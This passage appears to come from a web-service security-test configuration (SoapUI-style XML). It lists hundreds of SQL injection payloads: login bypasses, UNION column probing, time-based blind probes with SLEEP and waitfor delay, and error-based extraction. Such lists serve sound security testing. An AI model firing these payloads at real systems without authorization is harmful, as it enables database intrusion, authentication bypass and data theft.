30#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7300=7300 AND ('pKlZ'='pKlZ</con:sqlInjectionStrings><con:sqlInjectionStrings>'&amp;&amp;SLEEP(5)&amp;&amp;'1</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7300=7300 AND ('pKlZ'='pKlY</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>"*"</con:sqlInjectionStrings><con:sqlInjectionStrings>1)) or sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings><con:sqlInjectionStrings>''</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 10# </con:sqlInjectionStrings><con:sqlInjectionStrings>1)) or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>" OR "" = "</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3,4#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or 1=1/*</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 29# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings><con:sqlInjectionStrings>' OR '1</con:sqlInjectionStrings><con:sqlInjectionStrings>" OR 1 = 1 -- -</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT USER()--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings><con:sqlInjectionStrings>"-"</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' --</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings><con:sqlInjectionStrings>1) or sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=0#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#</con:sqlInjectionStrings><con:sqlInjectionStrings>benchmark(50000000,MD5(1))</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--</con:sqlInjectionStrings><con:sqlInjectionStrings>or pg_SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3,4--</con:sqlInjectionStrings><con:sqlInjectionStrings>or 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 18-- </con:sqlInjectionStrings><con:sqlInjectionStrings>');waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>'LIKE'</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),"'3'"#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 16# </con:sqlInjectionStrings><con:sqlInjectionStrings>1' ORDER BY 1--+</con:sqlInjectionStrings><con:sqlInjectionStrings>1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7300=7300 AND 'pKlZ'='pKlY</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7300=7300 AND 'pKlZ'='pKlZ</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX'#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>') or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 27# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 3-- </con:sqlInjectionStrings><con:sqlInjectionStrings>-2</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or 1=1--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--</con:sqlInjectionStrings><con:sqlInjectionStrings>'\"</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings><con:sqlInjectionStrings>' AND MID(VERSION(),1,1) = '5';</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=1 AND '%'='</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3#</con:sqlInjectionStrings><con:sqlInjectionStrings>"));waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or "1"="1"--</con:sqlInjectionStrings><con:sqlInjectionStrings>1/0</con:sqlInjectionStrings><con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings><con:sqlInjectionStrings>')) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>1 or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))</con:sqlInjectionStrings><con:sqlInjectionStrings>/*</con:sqlInjectionStrings><con:sqlInjectionStrings>//</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or ('1'='1'#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or 1=1/*</con:sqlInjectionStrings><con:sqlInjectionStrings>' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=0#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8#</con:sqlInjectionStrings><con:sqlInjectionStrings>'^'</con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=1--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 14# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6</con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=x</con:sqlInjectionStrings><con:sqlInjectionStrings>') or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin"/*</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1083=1083 AND (1427=1427</con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=y</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or '1'='1'--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 28-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND true</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,3,1))='c'</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6#</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or "1"="1"/*</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--</con:sqlInjectionStrings><con:sqlInjectionStrings>-1' UNION SELECT 1,2,3--+</con:sqlInjectionStrings><con:sqlInjectionStrings>1'</con:sqlInjectionStrings><con:sqlInjectionStrings>or benchmark(50000000,MD5(1))--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings><con:sqlInjectionStrings>1-false</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--</con:sqlInjectionStrings><con:sqlInjectionStrings>';waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 16-- </con:sqlInjectionStrings><con:sqlInjectionStrings>'));waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or '1'='1'/*</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 3# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)</con:sqlInjectionStrings><con:sqlInjectionStrings>,(select * from (select(sleep(10)))a)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or ("1"="1"#</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=0#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings><con:sqlInjectionStrings>' '</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,2,1))='y'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#</con:sqlInjectionStrings><con:sqlInjectionStrings>or SLEEP(5)="</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings><con:sqlInjectionStrings>or SLEEP(5)='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--</con:sqlInjectionStrings><con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>' or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7</con:sqlInjectionStrings><con:sqlInjectionStrings>+ SLEEP(10) + '</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=1-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 19# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 26-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),"'3</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 5# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings><con:sqlInjectionStrings>" or "x"="x</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 14-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>" or sleep(5)="</con:sqlInjectionStrings><con:sqlInjectionStrings>1234 " AND 1=0 UNION ALL SELECT "admin", 